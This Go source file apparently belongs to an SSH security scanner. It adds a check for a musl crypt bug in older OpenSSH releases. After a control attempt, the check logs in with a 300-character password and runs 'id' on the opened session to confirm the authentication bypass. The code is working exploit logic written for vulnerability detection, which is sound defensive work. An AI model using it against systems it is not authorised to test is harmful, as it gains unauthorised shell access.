package cmd

import (
	"errors"
	"fmt"
	"net"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnMuslCryptStar = "vuln-musl-crypt-star"

// muslCryptStarPasswordLen exceeds the 256-byte musl crypt(3) key limit that
// makes crypt() return the literal "*" instead of a hash.
const muslCryptStarPasswordLen = 300

// muslCryptStarFixedVersion is the first OpenSSH release that rejects short
// password hashes (MIN_PASSWORD_HASH_LEN); earlier releases are probed.
var muslCryptStarFixedVersion = [3]int{10, 6, 2}

// muslCryptStarVersionPattern matches an OpenSSH banner and captures the
// major, minor, and portable patch components.
var muslCryptStarVersionPattern = regexp.MustCompile(`^SSH-(?:2\.0|1\.99)-OpenSSH_(\d+)(?:\.(\d+))?(?:p(\d+))?`)

// muslCryptStarVersion parses an OpenSSH server banner into major/minor/patch
// components. Non-OpenSSH banners and banners without a version number
// return false.
func muslCryptStarVersion(version string) ([3]int, bool) {
	m := muslCryptStarVersionPattern.FindStringSubmatch(version)
	if m == nil {
		return [3]int{}, false
	}
	var out [3]int
	for i := 0; i < 3; i++ {
		if m[i+1] == "" {
			continue
		}
		n, err := strconv.Atoi(m[i+1])
		if err != nil {
			return [3]int{}, false
		}
		out[i] = n
	}
	return out, true
}

// muslCryptStarVulnerableVersion reports whether the banner is an OpenSSH
// release older than the one that rejects short password hashes.
func muslCryptStarVulnerableVersion(version string) bool {
	v, ok := muslCryptStarVersion(version)
	if !ok {
		return false
	}
	for i := 0; i < 3; i++ {
		if v[i] != muslCryptStarFixedVersion[i] {
			return v[i] < muslCryptStarFixedVersion[i]
		}
	}
	return false
}

// muslCryptStarConfirmed reports whether the long-password attempt opened a
// session that ran a command. Reaching the session stage alone is not enough:
// the channel can open and then fail before any command executes.
func muslCryptStarConfirmed(stage string, sessionOpened bool) bool {
	return stage == "session" && sessionOpened
}

// muslCryptStarExecRan reports whether an exec request completed on the
// session. A remote exit status (zero or not) and a channel that closed
// without sending one both mean the command was accepted and ran.
func muslCryptStarExecRan(err error) (string, bool) {
	if err == nil {
		return "0", true
	}
	var exitErr *ssh.ExitError
	if errors.As(err, &exitErr) {
		return strconv.Itoa(exitErr.ExitStatus()), true
	}
	var missing *ssh.ExitMissingError
	if errors.As(err, &missing) {
		return "", true
	}
	return "", false
}

// muslCryptStarSessionHandler runs a command on the opened session and records
// whether it ran. The flag is captured by the caller to confirm the finding.
func muslCryptStarSessionHandler(sessionOpened *bool) auth.SessionHandler {
	return func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		_ = c.SetDeadline(time.Now().Add(15 * time.Second))
		out, err := ses.CombinedOutput("id")
		res.SessionOutput = auth.CleanSessionOutput(out)
		status, ran := muslCryptStarExecRan(err)
		if !ran {
			return err
		}
		res.ExitStatus = status
		*sessionOpened = true
		return nil
	}
}

func sshCheckVulnMuslCryptStar(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMuslCryptStar
	if !conf.IsCheckEnabled(tname) {
		return nil
	}
	if !root.SupportsAuth("password") {
		return nil
	}
	if !muslCryptStarVulnerableVersion(root.Version) {
		conf.Logger.Debugf("%s %s skipped: server version %q is not a vulnerable OpenSSH release", addr, tname, root.Version)
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	passwordAuth := func(password string) ssh.AuthMethod {
		return ssh.AuthMethod(ssh.PasswordCallback(func() (string, error) {
			return password, nil
		}))
	}

	// A server that accepts a random short password is not exhibiting this
	// bug; attribute that to the password-any check instead.
	control := auth.SSHAuth(addr, options.WithStopStage("auth"), auth.SSHAuthHandlerSingle(passwordAuth(genRandomPassword())))
	if control.Stage == "auth" {
		conf.Logger.Debugf("%s %s skipped: a random short password was accepted for user %s", addr, tname, options.Username)
		return nil
	}

	testPass := strings.Repeat("A", muslCryptStarPasswordLen)
	am := passwordAuth(testPass)

	sessionOpened := false
	o := options.WithSessionHandler(muslCryptStarSessionHandler(&sessionOpened))
	res := auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(am))
	if !muslCryptStarConfirmed(res.Stage, sessionOpened) {
		conf.Logger.Debugf("%s %s did not open a session with the %d-byte password (stage %s): %v", addr, tname, muslCryptStarPasswordLen, res.Stage, res.Error)
		return nil
	}

	conf.Logger.Warnf("%s %s accepted a %d-byte password for user %s", addr, tname, muslCryptStarPasswordLen, options.Username)
	root.AddVuln(auth.VulnResult{
		ID:    tname,
		Ref:   "https://sshhole.com/",
		Proof: fmt.Sprintf("A random short password was rejected, but a %d-byte password opened a session for %s. Session output: %s", muslCryptStarPasswordLen, options.Username, res.SessionOutput),
	})
	res.SessionMethod = tname
	root.SessionMethod = tname
	root.SessionOutput = res.SessionOutput
	root.SessionSecret = testPass
	root.ExitStatus = res.ExitStatus
	root.SessionAuth = am
	return res
}
